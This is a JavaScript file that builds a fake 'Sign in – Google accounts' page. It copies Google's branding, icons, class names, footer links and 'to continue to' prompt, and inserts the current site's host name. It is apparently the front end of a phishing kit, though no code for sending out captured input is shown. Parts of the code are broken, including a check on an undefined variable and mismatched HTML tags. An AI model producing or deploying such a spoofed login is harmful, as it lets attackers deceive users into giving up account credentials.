const hasWord = (str, word) => 
  str.split(/\s+/).includes(word);

function updatetext() {
	var title_box = document.location.host;
  var input_element = document.querySelector("input");
	var mxlen = 27;
	var title_box = title_box.substr(0, mxlen);
	var title_box = "to continue to <mark class='blue_'>" + title_box + "...</mark>" + "";

	document.getElementById("text_2").innerHTML = title_box;
  input_element.addEventListener("keyup", () => {
    input_element.setAttribute("value", input_element.value);
    document.getElementById("placeholder_").style.cssText = `font-size:12px;`;
  })
}

function next() {
  var emty = "";
  var mailid = document.getElementById("fname").innerHTML;
  if (mailid > "") {
    if (/@gmail\.com$/.test(string)) {
      document.getElementById("spacer").innerHTML = `<br>`;
    const input_box = document.querySelector('#fname');
    const input_text = document.querySelector('#placeholder_');
    input_box.style.cssText = "outline: none;border: 2px solid red;";
    input_text.style.cssText = "color: red;";
    document.getElementById("error").innerHTML = `<span style="margin-top: -40px; text-align: left;" class="jibhHc inline-block"><svg style="text-align: left;" aria-hidden="true" class="stUf5b qpSchb" fill="#d93025" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg><p class="inline-block" style="color: red;">&nbsp;<a style="color: red; font-weight: 500; margin-top: 10px;">Please Enter you Email or phone</p></span></div>`
    }
  } else { 
    document.getElementById("html_").innerHTML = `
  <!DOCTYPE html>
  <html lang="en">
    <head>
      <meta charset="UTF-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <link rel="preconnect" href="https://fonts.gstatic.com" />
      <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet"/>
      <link rel="stylesheet" href="./reset.css" />
      <link rel="stylesheet" href="./styles.css" />
      <link rel="icon" type="image/x-icon" href="https://google.com/favicon.ico">
      <title>Sign in – Google accounts</title>
      <script src="./script.js"></script>
    </head>

    <body onload="updatetext()">
      <div class="container">
        <div class="card">
          <img class="disable-select" src="./images/google-logo.svg" alt="" />
          <h2>Welcome</h2><br>
          <div class="aCayab" style="margin: 0; padding: 0;"><div></div><div jscontroller="IIfQad" jsaction="click:cOuCgd; blur:O22p3e; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;" class="YZrg6 HnRr5d iiFyne cd29Sd" tabindex="0" role="link" jsname="af8ijd"><div class="gPHLDe"><div class="qQWzTd" aria-hidden="true"><svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="23px" height="23px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg></div></div><div jsname="fmcmS" class="KTeGk" data-profile-identifier=""><a style="font-size: 12px;" id="email">OBJECT(EMAIL);</a></div><div class="krLnGe"><svg aria-hidden="true" class="stUf5b MSBt4d" fill="transparent" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg></svg></div></div></div>

          <div class="input-contain">
    <input type="text" id="fname" name="fname" autocomplete="off" value="" aria-labelledby="placeholder-fname">
    <label class="placeholder-text" for="fname" id="placeholder-fname">
       <div class="text">Email or phone</div>
    </label>
  </div>
          <div class="btn-email">
            <button type="button"><a target="_blank" class="link" href="./400.html">Forgot Email?</a></button>
          </div>
          <p>
              Not your computer? Use Guest mode to sign in privately.
            <a target="_blank" href="">Learn more</a>
          </p>

          <div class="card-bottom">
            <a target="_blank" href="./400.html">Create account</a>
            <button type="button" class="disable-select">Next</button>
          </div>
        </div>

        <div class="footer">
          <select class="disable-select" name="select">
            <option value="English (United States)">
              English (United States)
            </option>
          </select>
          <div class="footer-span">
            <span><a target="_blank" class="btn" href="https://support.google.com/accounts?hl=en">Help</a></span>
            <span><a target="_blank" class="btn" href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true">Privacy</a></span>
            <span><a target="_blank" class="btn" href="https://accounts.google.com/TOS?loc=US&hl=en">Terms</a></span>
          </div>
        </div>
      </div>
    </body>
  </html>
  `;
  }
}